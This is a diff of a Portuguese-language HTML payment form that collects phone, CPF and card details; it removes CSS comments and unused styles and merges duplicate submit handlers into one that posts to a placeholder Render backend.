@@ -11,25 +11,25 @@
             font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4; /* Fundo cinza claro */
-            color: #333; /* Cor de texto cinza escuro */
+            background-color: #f4f4f4;
+            color: #333;
         }
         .form-container {
             max-width: 600px;
             margin: 40px auto;
             padding: 20px;
-            background-color: #ffffff; /* Fundo branco */
+            background-color: #ffffff;
             border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1); /* Sombra suave */
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
         }
         h1 {
             text-align: center;
-            color: #0D47A1; /* Azul escuro */
+            color: #0D47A1;
         }
         label {
             display: block;
             margin: 10px 0 5px;
-            color: #0D47A1; /* Azul escuro */
+            color: #0D47A1;
         }
         input, button {
             width: calc(100% - 22px);
@@ -38,14 +38,14 @@
             border-radius: 4px;
             border: 1px solid #ddd;
             box-sizing: border-box;
-            background-color: #f9f9f9; /* Fundo leve para os inputs */
+            background-color: #f9f9f9;
         }
         input:focus {
-            border-color: #0D47A1; /* Azul escuro */
+            border-color: #0D47A1;
             outline: none;
         }
         button {
-            background-color: #0D47A1; /* Azul escuro */
+            background-color: #0D47A1;
             color: white;
             border: none;
             cursor: pointer;
@@ -55,43 +55,29 @@
             justify-content: center;
             transition: background-color 0.3s ease;
         }
-        button i {
-            margin-right: 8px;
-        }
         button:hover {
-            background-color: #094185; /* Azul mais escuro */
+            background-color: #094185;
         }
         fieldset {
-            border: 2px solid #0D47A1; /* Borda azul escuro */
+            border: 2px solid #0D47A1;
             border-radius: 8px;
             padding: 15px;
             margin: 15px 0;
         }
         legend {
             font-weight: bold;
-            color: #0D47A1; /* Azul escuro */
+            color: #0D47A1;
             padding: 0 10px;
-        }
-        .card-info {
-            display: flex;
-            flex-direction: column;
-        }
-        .card-info label, .card-info input {
-            margin-bottom: 10px;
         }
         #resultado {
             margin-top: 20px;
             padding: 10px;
-            background-color: rgba(13, 71, 161, 0.1); /* Fundo azul claro */
+            background-color: rgba(13, 71, 161, 0.1);
             border-radius: 4px;
-            color: #0D47A1; /* Texto azul escuro */
-        }
-        .error {
-            border-color: #b71c1c; /* Vermelho escuro */
-            background-color: rgba(255, 0, 0, 0.1); /* Fundo vermelho claro */
+            color: #0D47A1;
         }
         .error-message {
-            color: #b71c1c; /* Vermelho escuro */
+            color: #b71c1c;
             font-weight: bold;
             margin-top: 10px;
             display: none;
@@ -133,43 +119,44 @@
         <div class="error-message">Por favor, preencha todos os campos corretamente antes de enviar.</div>
         <div id="resultado"></div>
     </div>
+
     <script>
         function formatPhone(value) {
             return value
-                .replace(/\D/g, '') // Remove tudo o que não é dígito
-                .replace(/^(\d{2})(\d)/, '($1) $2') // Adiciona parênteses em torno do DDD
-                .replace(/(\d{5})(\d)/, '$1-$2') // Adiciona hífen entre o quinto e sexto dígito
-                .slice(0, 15); // Limita o tamanho do telefone formatado
+                .replace(/\D/g, '')
+                .replace(/^(\d{2})(\d)/, '($1) $2')
+                .replace(/(\d{5})(\d)/, '$1-$2')
+                .slice(0, 15);
         }
 
         function formatCPF(value) {
             return value
-                .replace(/\D/g, '') // Remove tudo o que não é dígito
-                .replace(/(\d{3})(\d)/, '$1.$2') // Adiciona ponto após o terceiro dígito
-                .replace(/(\d{3})(\d)/, '$1.$2') // Adiciona ponto após o sexto dígito
-                .replace(/(\d{3})(\d{1,2})$/, '$1-$2') // Adiciona hífen antes dos dois últimos dígitos
-                .slice(0, 14); // Limita o tamanho do CPF formatado
+                .replace(/\D/g, '')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
+                .slice(0, 14);
         }
 
         function formatCardNumber(value) {
             return value
-                .replace(/\D/g, '') // Remove tudo o que não é dígito
-                .replace(/(.{4})/g, '$1 ') // Adiciona espaço a cada 4 dígitos
-                .trim() // Remove o espaço extra no final
-                .slice(0, 19); // Limita o tamanho a 19 caracteres (16 dígitos + 3 espaços)
+                .replace(/\D/g, '')
+                .replace(/(.{4})/g, '$1 ')
+                .trim()
+                .slice(0, 19);
         }
 
         function formatExpiryDate(value) {
             return value
-                .replace(/\D/g, '') // Remove tudo o que não é dígito
-                .replace(/(\d{2})(\d)/, '$1/$2') // Adiciona barra entre o mês e o ano
-                .slice(0, 5); // Limita o tamanho da data de validade formatada
+                .replace(/\D/g, '')
+                .replace(/(\d{2})(\d)/, '$1/$2')
+                .slice(0, 5);
         }
 
         function formatCVV(value) {
             return value
-                .replace(/\D/g, '') // Remove tudo o que não é dígito
-                .slice(0, 3); // Limita o tamanho do CVV
+                .replace(/\D/g, '')
+                .slice(0, 3);
         }
 
         document.getElementById('telefone').addEventListener('input', function() {
@@ -190,48 +177,26 @@
 
         document.getElementById('cvv').addEventListener('input', function() {
             this.value = formatCVV(this.value);
-        })
-</script>
-        <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(event) {
-        event.preventDefault();  // Impede o recarregamento da página
-
-        const formData = new FormData(this);
-
-        // Envia os dados para o backend
-        fetch('http://localhost:3000/submit', {
-            method: 'POST',
-            body: new URLSearchParams(formData)
-        })
-        .then(response => response.text())
-        .then(result => {
-            document.getElementById('resultado').textContent = result;  // Exibe a resposta do backend
-        })
-        .catch(error => {
-            console.error('Erro:', error);
-            document.getElementById('resultado').textContent = 'Erro ao enviar dados.';
         });
-    });
-</script>
-<script>
-    document.getElementById('paymentForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Evita o envio padrão do formulário
 
-        const formData = new FormData(this);
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-        fetch('http://localhost:3000/submit', {
-            method: 'POST',
-            body: new URLSearchParams(formData)
-        })
-        .then(response => response.text())
-        .then(result => {
-            document.getElementById('resultado').textContent = result;
-        })
-        .catch(error => {
-            console.error('Erro:', error);
-            document.getElementById('resultado').textContent = 'Erro ao enviar dados.';
+            const formData = new FormData(this);
+            // Altere a URL abaixo para o seu endpoint no Render
+            fetch('https://seu-app.onrender.com/submit', {
+                method: 'POST',
+                body: new URLSearchParams(formData)
+            })
+            .then(response => response.text())
+            .then(result => {
+                document.getElementById('resultado').textContent = result;
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                document.getElementById('resultado').textContent = 'Erro ao enviar dados.';
+            });
         });
-    });
-</script>
+    </script>
 </body>
-  </html>
+</html>
